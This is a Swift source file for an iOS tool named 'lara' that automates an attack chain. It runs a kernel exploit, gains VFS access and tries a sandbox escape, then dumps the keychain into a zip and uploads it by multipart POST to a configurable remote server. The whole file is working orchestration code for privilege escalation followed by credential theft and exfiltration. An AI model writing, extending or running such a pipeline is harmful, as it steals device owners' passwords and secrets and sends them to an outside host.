//
//  LaraAutoPipeline.swift
//  lara
//
//  自动流水线：exploit → vfs → sbx → 采集 → 上传
//  带 checkpoint，中断可续跑
//

import Foundation

final class LaraAutoPipeline {

    static let shared = LaraAutoPipeline()

    enum Stage: String {
        case idle, kernel, vfs, sbx, collect, upload, done, failed
    }

    private(set) var stage: Stage = .idle

    private var mgr: laramgr { laramgr.shared }

    let ckKey = "lara.autopipeline.checkpoint"
    let ckStatus = "lara.autopipeline.status"

    /// 上报地址（自建；可在 lara 设置里改）
    var uploadURL: String {
        get { UserDefaults.standard.string(forKey: "keychain.uploadURL") ?? "" }
        set { UserDefaults.standard.set(newValue, forKey: "keychain.uploadURL") }
    }

    private func log(_ s: String) {
        mgr.logmsg("[pipe] " + s)
    }

    // MARK: - 入口

    func run(autoUpload: Bool = true, completion: ((Bool) -> Void)? = nil) {
        let saved = UserDefaults.standard.string(forKey: ckKey) ?? ""
        if !saved.isEmpty { log("检测到 checkpoint：\(saved)") }

        // ① 内核
        stage = .kernel; persist()
        if !mgr.dsready {
            log("启动 kernel exploit…")
            waitRun { self.mgr.run(completion: $0) }
            if !mgr.dsready {
                log("kernel exploit 失败")
                stage = .failed; persist(); completion?(false); return
            }
        }
        log("kernel ready, kernbase=0x" + String(mgr.kernbase, radix: 16))

        // ② 偏移
        if !mgr.hasOffsets {
            log("等待偏移解析（在 lara 主界面点 Initialize）")
        }

        // ③ vfs
        stage = .vfs; persist()
        if !mgr.vfsready {
            log("vfsinit…")
            waitRun { self.mgr.vfsinit(completion: $0) }
            if !mgr.vfsready {
                log("vfsinit 失败")
                stage = .failed; persist(); completion?(false); return
            }
        }
        log("vfs ready")

        // ④ sbx
        stage = .sbx; persist()
        if !mgr.sbxready {
            log("sbx escape…")
            waitRun { self.mgr.sbxescape(completion: $0) }
            log("sbx \(mgr.sbxready ? "ready" : "failed（不阻塞，vfs 已够用）")")
        }

        // ⑤ 采集
        stage = .collect; persist()
        guard let payload = KeychainDumpManager.shared.collectAll() else {
            log("采集失败")
            stage = .failed; persist(); completion?(false); return
        }
        log("采集完成 \(payload.count) B")

        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let local = docs.appendingPathComponent("lara_dump_\(Int(Date().timeIntervalSince1970)).zip")
        try? payload.write(to: local)
        log("本地留存 \(local.lastPathComponent)")

        // ⑥ 上传
        stage = .upload; persist()
        guard autoUpload, !uploadURL.isEmpty else {
            log("未配置上传地址，仅本地留存")
            stage = .done; persist(); completion?(true); return
        }
        Uploader.upload(payload: payload, to: uploadURL) { ok, msg in
            self.log("上传 \(ok ? "成功" : "失败")：\(msg)")
            self.stage = ok ? .done : .failed
            self.persist()
            if ok { UserDefaults.standard.removeObject(forKey: self.ckKey) }
            completion?(ok)
        }
    }

    private func waitRun(_ body: (@escaping (Bool) -> Void) -> Void, timeout: TimeInterval = 180) {
        let sem = DispatchSemaphore(value: 0)
        body { _ in sem.signal() }
        _ = sem.wait(timeout: .now() + timeout)
    }

    private func persist() {
        UserDefaults.standard.set(stage.rawValue, forKey: ckStatus)
        UserDefaults.standard.set(stage.rawValue, forKey: ckKey)
    }
}

// MARK: - 上传

enum Uploader {

    /// 单文件 multipart/form-data，字段名 file（与同行协议一致）
    static func upload(payload: Data, to urlStr: String,
                       completion: @escaping (Bool, String) -> Void) {
        guard let url = URL(string: urlStr) else {
            completion(false, "URL 非法"); return
        }
        let boundary = "----WebKitFormBoundary" + UUID().uuidString.replacingOccurrences(of: "-", with: "")
        var body = Data()
        let fname = "lara_dump_\(Int(Date().timeIntervalSince1970)).zip"

        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"file\"; filename=\"\(fname)\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: application/octet-stream\r\n\r\n".data(using: .utf8)!)
        body.append(payload)
        body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)

        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        req.setValue("lara/0.1", forHTTPHeaderField: "User-Agent")
        req.timeoutInterval = 180

        laramgr.shared.logmsg("[up] POST \(urlStr) \(body.count) B")
        URLSession.shared.uploadTask(with: req, from: body) { data, resp, err in
            if let err = err {
                completion(false, err.localizedDescription); return
            }
            let code = (resp as? HTTPURLResponse)?.statusCode ?? -1
            let txt = data.flatMap { String(data: $0, encoding: .utf8) } ?? ""
            if (200..<300).contains(code) {
                if let d = data, d.isEmpty {
                    completion(false, "server saved 0 bytes")
                } else {
                    completion(true, "HTTP \(code) \(txt.prefix(120))")
                }
            } else {
                completion(false, "HTTP \(code) \(txt.prefix(120))")
            }
        }.resume()
    }
}
